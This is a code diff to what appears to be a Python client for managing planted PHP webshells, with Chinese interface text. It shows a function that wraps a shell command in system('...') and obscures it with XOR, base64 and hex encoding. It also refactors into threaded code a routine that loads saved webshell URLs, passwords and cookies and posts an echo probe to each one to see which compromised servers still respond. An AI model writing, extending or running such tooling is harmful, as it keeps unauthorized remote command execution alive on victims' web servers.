@@ -6,6 +6,7 @@
 """
 import argparse
 import os
+import threading
 from urllib.parse import parse_qs
 
 import chardet
@@ -43,7 +44,7 @@ def parse_cookies_from_str(cookie_str):
     return cookies
 
 
-def xor_decode(string, key):
+def xor_decode_encode(string, key):
     str_length = len(string)
     key_length = len(key)
     tmp = 0
@@ -61,11 +62,54 @@ def xor_decode(string, key):
 
 
 def payload_generate(cmd, key):
-    payload = xor_decode("system('" + cmd + "');", key)
+    payload = xor_decode_encode("system('" + cmd + "');", key)
     payload = base64.b64encode(payload.encode("utf-8"))
     payload = payload.hex()
     print(payload)
     return payload
+
+
+def check_webshell(filename, alive, headers):
+    try:
+        with open("./webshells/" + filename + ".json", "r") as json_file:
+            config_data = json.load(json_file)
+        post_data = config_data["Password"] + f"=echo {alive};"
+        response = requests.post(config_data["Webshell"], headers=headers, cookies=config_data["Cookie"],
+                                 data=parse_qs(post_data), timeout=3)
+        encoding = chardet.detect(response.content)['encoding']
+        if encoding is not None:
+            result = response.content.decode(encoding, errors='ignore')
+        else:
+            result = response.text
+        if alive in result:
+            print("[" + color("+", "green") + f"]{filename}")
+        else:
+            print("[" + color("-", "red") + f"]{filename}")
+    except:
+        print("[" + color("-", "red") + f"]{filename} - 无法连接")
+
+
+def check_webshells():
+    print("------------------------------配置列表------------------------------")
+    filenames = []
+    directory = './webshells/'
+    threads = []
+    alive = generate_random_string(20)
+    headers = {'User-Agent': 'Mozilla/5.0'}
+
+    for filename in os.listdir(directory):
+        if os.path.isfile(os.path.join(directory, filename)):
+            base_name = os.path.splitext(filename)[0]
+            filenames.append(base_name)
+            thread = threading.Thread(target=check_webshell, args=(base_name, alive, headers))
+            thread.start()
+            threads.append(thread)
+
+    for thread in threads:
+        thread.join()
+
+    print("------------------------------任务结束------------------------------")
+    return 1
 
 
 def payload_php_cmd_generate(cmd, disable_functions):
@@ -232,28 +276,6 @@ def main():
         return 1
 
     if args.list_config:
-        print("------------------------------配置列表------------------------------")
-        filenames = []
-        directory = './webshells/'
-        for filename in os.listdir(directory):
-            alive = generate_random_string(20)
-            if os.path.isfile(os.path.join(directory, filename)):
-                base_name = os.path.splitext(filename)[0]
-                filenames.append(base_name)
-                with open("./webshells/" + base_name + ".json", "r") as json_file:
-                    config_data = json.load(json_file)
-                post_data = config_data["Password"] + f"=echo {alive};"
-                response = requests.post(config_data["Webshell"], headers=headers, cookies=config_data["Cookie"],
-                                         data=parse_qs(post_data))
-                encoding = chardet.detect(response.content)['encoding']
-                if encoding is not None:
-                    result = response.content.decode(encoding, errors='ignore')
-                else:
-                    result = response.text
-                if alive in result:
-                    print("[" + color("+", "green") + f"]{base_name}")
-                else:
-                    print("[" + color("-", "red") + f"]{base_name}")
-        print("------------------------------任务结束------------------------------")
+        check_webshells()
         return 1
 
